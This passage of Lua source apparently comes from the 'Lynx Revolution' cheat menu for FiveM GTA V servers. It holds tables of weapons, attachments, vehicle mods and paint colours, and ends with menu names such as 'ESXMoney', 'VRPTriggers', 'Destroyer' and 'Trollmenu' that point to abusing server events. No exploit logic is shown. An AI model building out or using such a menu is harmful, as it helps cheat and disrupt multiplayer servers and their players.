                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SC_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SC_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, BullpupRifle = {
            id = "weapon_bullpuprifle", name = "~h~~r~> ~s~Bullpup Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2", name = "~h~~r~> ~s~Bullpup Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_BP_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_BP_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CompactRifle = {
            id = "weapon_compactrifle", name = "~h~~r~> ~s~Compact Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"
                    }
                }
            }
        }
    }, LMG = {
        MG = {
            id = "weapon_mg", name = "~h~~r~> ~s~MG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"
                    }
                }
            }
        }, CombatMG = {
            id = "weapon_combatmg", name = "~h~~r~> ~s~Combat MG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CombatMGMkII = {
            id = "weapon_combatmg_mk2", name = "~h~~r~> ~s~Combat MG Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MG_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MG_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, GusenbergSweeper = {
            id = "weapon_gusenberg", name = "~h~~r~> ~s~GusenbergSweeper", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"
                    }
                }
            }
        }
    }, Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle", name = "~h~~r~> ~s~Sniper Rifle", bInfAmmo = false, mods = {
                Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, HeavySniper = {
            id = "weapon_heavysniper", name = "~h~~r~> ~s~Heavy Sniper", bInfAmmo = false, mods = {
                Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }
                }
            }
        }, HeavySniperMkII = {
            id = "weapon_heavysniper_mk2", name = "~h~~r~> ~s~Heavy Sniper Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"
                    }, {
                        name = "~h~~r~> ~s~Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }, {
                        name = "~h~~r~> ~s~Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"
                    }, {
                        name = "~h~~r~> ~s~Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SR_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                    }, {
                        name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                    }, {
                        name = "~h~~r~> ~s~Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"
                    }
                }
            }
        }, MarksmanRifle = {
            id = "weapon_marksmanrifle", name = "~h~~r~> ~s~Marksman Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2", name = "~h~~r~> ~s~Marksman Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }, {
                        name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MRFL_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }
    }, Heavy = {
        RPG = {
            id = "weapon_rpg", name = "~h~~r~> ~s~RPG", bInfAmmo = false, mods = {}
        }, GrenadeLauncher = {
            id = "weapon_grenadelauncher", name = "~h~~r~> ~s~Grenade Launcher", bInfAmmo = false, mods = {}
        }, GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke", name = "~h~~r~> ~s~Grenade Launcher Smoke", bInfAmmo = false, mods = {}
        }, Minigun = {
            id = "weapon_minigun", name = "~h~~r~> ~s~Minigun", bInfAmmo = false, mods = {}
        }, FireworkLauncher = {
            id = "weapon_firework", name = "~h~~r~> ~s~Firework Launcher", bInfAmmo = false, mods = {}
        }, Railgun = {
            id = "weapon_railgun", name = "~h~~r~> ~s~Railgun", bInfAmmo = false, mods = {}
        }, HomingLauncher = {
            id = "weapon_hominglauncher", name = "~h~~r~> ~s~Homing Launcher", bInfAmmo = false, mods = {}
        }, CompactGrenadeLauncher = {
            id = "weapon_compactlauncher", name = "~h~~r~> ~s~Compact Grenade Launcher", bInfAmmo = false, mods = {}
        }, Widowmaker = {
            id = "weapon_rayminigun", name = "~h~~r~> ~s~Widowmaker", bInfAmmo = false, mods = {}
        }
    }, Throwables = {
        Grenade = {
            id = "weapon_grenade", name = "~h~~r~> ~s~Grenade", bInfAmmo = false, mods = {}
        }, BZGas = {
            id = "weapon_bzgas", name = "~h~~r~> ~s~BZ Gas", bInfAmmo = false, mods = {}
        }, MolotovCocktail = {
            id = "weapon_molotov", name = "~h~~r~> ~s~Molotov Cocktail", bInfAmmo = false, mods = {}
        }, StickyBomb = {
            id = "weapon_stickybomb", name = "~h~~r~> ~s~Sticky Bomb", bInfAmmo = false, mods = {}
        }, ProximityMines = {
            id = "weapon_proxmine", name = "~h~~r~> ~s~Proximity Mines", bInfAmmo = false, mods = {}
        }, Snowballs = {
            id = "weapon_snowball", name = "~h~~r~> ~s~Snowballs", bInfAmmo = false, mods = {}
        }, PipeBombs = {
            id = "weapon_pipebomb", name = "~h~~r~> ~s~Pipe Bombs", bInfAmmo = false, mods = {}
        }, Baseball = {
            id = "weapon_ball", name = "~h~~r~> ~s~Baseball", bInfAmmo = false, mods = {}
        }, TearGas = {
            id = "weapon_smokegrenade", name = "~h~~r~> ~s~Tear Gas", bInfAmmo = false, mods = {}
        }, Flare = {
            id = "weapon_flare", name = "~h~~r~> ~s~Flare", bInfAmmo = false, mods = {}
        }
    }, Misc = {
        Parachute = {
            id = "gadget_parachute", name = "~h~~r~> ~s~Parachute", bInfAmmo = false, mods = {}
        }, FireExtinguisher = {
            id = "weapon_fireextinguisher", name = "~h~~r~> ~s~Fire Extinguisher", bInfAmmo = false, mods = {}
        }
    }
}
local bp = false;
local bq = false;
local br = false;
local bs = false;
local bt = nil;
local bu = {}
local bv = {}
local bw = nil;
local bx = false;
local by = -1;
local bz = -1;
local bA = -1;
local bB = false;
local bC = {
    {
        name = "~h~Spoilers", id = 0
    }, {
        name = "~h~Front Bumper", id = 1
    }, {
        name = "~h~Rear Bumper", id = 2
    }, {
        name = "~h~Side Skirt", id = 3
    }, {
        name = "~h~Exhaust", id = 4
    }, {
        name = "~h~Frame", id = 5
    }, {
        name = "~h~Grille", id = 6
    }, {
        name = "~h~Hood", id = 7
    }, {
        name = "~h~Fender", id = 8
    }, {
        name = "~h~Right Fender", id = 9
    }, {
        name = "~h~Roof", id = 10
    }, {
        name = "~h~Vanity Plates", id = 25
    }, {
        name = "~h~Trim", id = 27
    }, {
        name = "~h~Ornaments", id = 28
    }, {
        name = "~h~Dashboard", id = 29
    }, {
        name = "~h~Dial", id = 30
    }, {
        name = "~h~Door Speaker", id = 31
    }, {
        name = "~h~Seats", id = 32
    }, {
        name = "~h~Steering Wheel", id = 33
    }, {
        name = "~h~Shifter Leavers", id = 34
    }, {
        name = "~h~Plaques", id = 35
    }, {
        name = "~h~Speakers", id = 36
    }, {
        name = "~h~Trunk", id = 37
    }, {
        name = "~h~Hydraulics", id = 38
    }, {
        name = "~h~Engine Block", id = 39
    }, {
        name = "~h~Air Filter", id = 40
    }, {
        name = "~h~Struts", id = 41
    }, {
        name = "~h~Arch Cover", id = 42
    }, {
        name = "~h~Aerials", id = 43
    }, {
        name = "~h~Trim 2", id = 44
    }, {
        name = "~h~Tank", id = 45
    }, {
        name = "~h~Windows", id = 46
    }, {
        name = "~h~Livery", id = 48
    }, {
        name = "~h~Horns", id = 14
    }, {
        name = "~h~Wheels", id = 23
    }, {
        name = "~h~Wheel Types", id = "wheeltypes"
    }, {
        name = "~h~Extras", id = "extra"
    }, {
        name = "~h~Neons", id = "neon"
    }, {
        name = "~h~Paint", id = "paint"
    }, {
        name = "~h~Headlights Color", id = "headlight"
    }, {
        name = "~h~Licence Plate", id = "licence"
    }
}
local bD = {
    {
        name = "~h~~r~Engine", id = 11
    }, {
        name = "~h~~b~Brakes", id = 12
    }, {
        name = "~h~~g~Transmission", id = 13
    }, {
        name = "~h~~y~Suspension", id = 15
    }, {
        name = "~h~~b~Armor", id = 16
    }
}
local bE = {
    {
        name = "~h~Blue on White 2", id = 0
    }, {
        name = "~h~Blue on White 3", id = 4
    }, {
        name = "~h~Yellow on Blue", id = 2
    }, {
        name = "~h~Yellow on Black", id = 1
    }, {
        name = "~h~North Yankton", id = 5
    }
}
local bF = {
    {
        name = "~h~Default", id = -1
    }, {
        name = "~h~White", id = 0
    }, {
        name = "~h~Blue", id = 1
    }, {
        name = "~h~Electric Blue", id = 2
    }, {
        name = "~h~Mint Green", id = 3
    }, {
        name = "~h~Lime Green", id = 4
    }, {
        name = "~h~Yellow", id = 5
    }, {
        name = "~h~Golden Shower", id = 6
    }, {
        name = "~h~Orange", id = 7
    }, {
        name = "~h~Red", id = 8
    }, {
        name = "~h~Pony Pink", id = 9
    }, {
        name = "~h~Hot Pink", id = 10
    }, {
        name = "~h~Purple", id = 11
    }, {
        name = "~h~Blacklight", id = 12
    }
}
local bG = {
    ["Stock Horn"] = -1, ["Truck Horn"] = 1, ["Police Horn"] = 2, ["Clown Horn"] = 3, ["Musical Horn 1"] = 4, ["Musical Horn 2"] = 5, ["Musical Horn 3"] = 6, ["Musical Horn 4"] = 7, ["Musical Horn 5"] = 8, ["Sad Trombone Horn"] = 9, ["Classical Horn 1"] = 10, ["Classical Horn 2"] = 11, ["Classical Horn 3"] = 12, ["Classical Horn 4"] = 13, ["Classical Horn 5"] = 14, ["Classical Horn 6"] = 15, ["Classical Horn 7"] = 16, ["Scaledo Horn"] = 17, ["Scalere Horn"] = 18, ["Salemi Horn"] = 19, ["Scalefa Horn"] = 20, ["Scalesol Horn"] = 21, ["Scalela Horn"] = 22, ["Scaleti Horn"] = 23, ["Scaledo Horn High"] = 24, ["Jazz Horn 1"] = 25, ["Jazz Horn 2"] = 26, ["Jazz Horn 3"] = 27, ["Jazz Loop Horn"] = 28, ["Starspangban Horn 1"] = 28, ["Starspangban Horn 2"] = 29, ["Starspangban Horn 3"] = 30, ["Starspangban Horn 4"] = 31, ["Classical Loop 1"] = 32, ["Classical Horn 8"] = 33, ["Classical Loop 2"] = 34
}
local bH = {
    ["White"] = {
        255, 255, 255
    }, ["Blue"] = {
        0, 0, 255
    }, ["Electric Blue"] = {
        0, 150, 255
    }, ["Mint Green"] = {
        50, 255, 155
    }, ["Lime Green"] = {
        0, 255, 0
    }, ["Yellow"] = {
        255, 255, 0
    }, ["Golden Shower"] = {
        204, 204, 0
    }, ["Orange"] = {
        255, 128, 0
    }, ["Red"] = {
        255, 0, 0
    }, ["Pony Pink"] = {
        255, 102, 255
    }, ["Hot Pink"] = {
        255, 0, 255
    }, ["Purple"] = {
        153, 0, 153
    }
}
local bI = {
    {
        name = "~h~Black", id = 0
    }, {
        name = "~h~Carbon Black", id = 147
    }, {
        name = "~h~Graphite", id = 1
    }, {
        name = "~h~Anhracite Black", id = 11
    }, {
        name = "~h~Black Steel", id = 2
    }, {
        name = "~h~Dark Steel", id = 3
    }, {
        name = "~h~Silver", id = 4
    }, {
        name = "~h~Bluish Silver", id = 5
    }, {
        name = "~h~Rolled Steel", id = 6
    }, {
        name = "~h~Shadow Silver", id = 7
    }, {
        name = "~h~Stone Silver", id = 8
    }, {
        name = "~h~Midnight Silver", id = 9
    }, {
        name = "~h~Cast Iron Silver", id = 10
    }, {
        name = "~h~Red", id = 27
    }, {
        name = "~h~Torino Red", id = 28
    }, {
        name = "~h~Formula Red", id = 29
    }, {
        name = "~h~Lava Red", id = 150
    }, {
        name = "~h~Blaze Red", id = 30
    }, {
        name = "~h~Grace Red", id = 31
    }, {
        name = "~h~Garnet Red", id = 32
    }, {
        name = "~h~Sunset Red", id = 33
    }, {
        name = "~h~Cabernet Red", id = 34
    }, {
        name = "~h~Wine Red", id = 143
    }, {
        name = "~h~Candy Red", id = 35
    }, {
        name = "~h~Hot Pink", id = 135
    }, {
        name = "~h~Pfsiter Pink", id = 137
    }, {
        name = "~h~Salmon Pink", id = 136
    }, {
        name = "~h~Sunrise Orange", id = 36
    }, {
        name = "~h~Orange", id = 38
    }, {
        name = "~h~Bright Orange", id = 138
    }, {
        name = "~h~Gold", id = 99
    }, {
        name = "~h~Bronze", id = 90
    }, {
        name = "~h~Yellow", id = 88
    }, {
        name = "~h~Race Yellow", id = 89
    }, {
        name = "~h~Dew Yellow", id = 91
    }, {
        name = "~h~Dark Green", id = 49
    }, {
        name = "~h~Racing Green", id = 50
    }, {
        name = "~h~Sea Green", id = 51
    }, {
        name = "~h~Olive Green", id = 52
    }, {
        name = "~h~Bright Green", id = 53
    }, {
        name = "~h~Gasoline Green", id = 54
    }, {
        name = "~h~Lime Green", id = 92
    }, {
        name = "~h~Midnight Blue", id = 141
    }, {
        name = "~h~Galaxy Blue", id = 61
    }, {
        name = "~h~Dark Blue", id = 62
    }, {
        name = "~h~Saxon Blue", id = 63
    }, {
        name = "~h~Blue", id = 64
    }, {
        name = "~h~Mariner Blue", id = 65
    }, {
        name = "~h~Harbor Blue", id = 66
    }, {
        name = "~h~Diamond Blue", id = 67
    }, {
        name = "~h~Surf Blue", id = 68
    }, {
        name = "~h~Nautical Blue", id = 69
    }, {
        name = "~h~Racing Blue", id = 73
    }, {
        name = "~h~Ultra Blue", id = 70
    }, {
        name = "~h~Light Blue", id = 74
    }, {
        name = "~h~Chocolate Brown", id = 96
    }, {
        name = "~h~Bison Brown", id = 101
    }, {
        name = "~h~Creeen Brown", id = 95
    }, {
        name = "~h~Feltzer Brown", id = 94
    }, {
        name = "~h~Maple Brown", id = 97
    }, {
        name = "~h~Beechwood Brown", id = 103
    }, {
        name = "~h~Sienna Brown", id = 104
    }, {
        name = "~h~Saddle Brown", id = 98
    }, {
        name = "~h~Moss Brown", id = 100
    }, {
        name = "~h~Woodbeech Brown", id = 102
    }, {
        name = "~h~Straw Brown", id = 99
    }, {
        name = "~h~Sandy Brown", id = 105
    }, {
        name = "~h~Bleached Brown", id = 106
    }, {
        name = "~h~Schafter Purple", id = 71
    }, {
        name = "~h~Spinnaker Purple", id = 72
    }, {
        name = "~h~Midnight Purple", id = 142
    }, {
        name = "~h~Bright Purple", id = 145
    }, {
        name = "~h~Cream", id = 107
    }, {
        name = "~h~Ice White", id = 111
    }, {
        name = "~h~Frost White", id = 112
    }
}
local bJ = {
    {
        name = "~h~Black", id = 12
    }, {
        name = "~h~Gray", id = 13
    }, {
        name = "~h~Light Gray", id = 14
    }, {
        name = "~h~Ice White", id = 131
    }, {
        name = "~h~Blue", id = 83
    }, {
        name = "~h~Dark Blue", id = 82
    }, {
        name = "~h~Midnight Blue", id = 84
    }, {
        name = "~h~Midnight Purple", id = 149
    }, {
        name = "~h~Schafter Purple", id = 148
    }, {
        name = "~h~Red", id = 39
    }, {
        name = "~h~Dark Red", id = 40
    }, {
        name = "~h~Orange", id = 41
    }, {
        name = "~h~Yellow", id = 42
    }, {
        name = "~h~Lime Green", id = 55
    }, {
        name = "~h~Green", id = 128
    }, {
        name = "~h~Forest Green", id = 151
    }, {
        name = "~h~Foliage Green", id = 155
    }, {
        name = "~h~Olive Darb", id = 152
    }, {
        name = "~h~Dark Earth", id = 153
    }, {
        name = "~h~Desert Tan", id = 154
    }
}
local bK = {
    {
        name = "~h~Brushed Steel", id = 117
    }, {
        name = "~h~Brushed Black Steel", id = 118
    }, {
        name = "~h~Brushed Aluminum", id = 119
    }, {
        name = "~h~Pure Gold", id = 158
    }, {
        name = "~h~Brushed Gold", id = 159
    }
}
defaultVehAction = ""
if GetVehiclePedIsUsing(PlayerPedId()) then veh = GetVehiclePedIsUsing(PlayerPedId()) end;
local bL = true;
local bM = "LynxX"
local bN = "Lynx ~u~Revolution"
local bO = "SelfMenu"
local bP = "Self Menu"
local bQ = "LuaMenu"
local bR = "VRPTriggers"
local bS = "TeleportMenu"
local bT = "WeaponMenu"
local bU = "AdvM"
local bV = "VehicleMenu"
local bW = "OnlinePlayerMenu"
local bX = "PlayerOptionsMenu"
local bY = "Destroyer"
local bZ = "ESXMoney"
local b_ = "Credits"
local c0 = "MiscTriggers"
local c1 = "CarOptions"
local c2 = "MainTrailer"
local c3 = "MainTrailerSel"
local c4 = "LSC"
local c5 = "ESPMenu"
local c6 = "CsMenu"
local c7 = "GCT"
local c8 = "GlobalAllPlayers"
local c9 = "Trollmenu"
local ca = "ESXCustom"
local cb = "ESXDrugs"
local cc = "SpawnPeds"
local cd = "BoostMenu"
local ce = "VRPPlayerTriggers"
local cf = "performance"
local cg = "tunings"
local ch = "GiveSingleWeaponPlayer"
local cj = "WeaponOptions"
local ck = "CarTypeSelection"
local cl = "MainTrailerSpa"
local cm = "CarTypes"
local cn = "ModSelect"
local co = "ESXTriggerini"
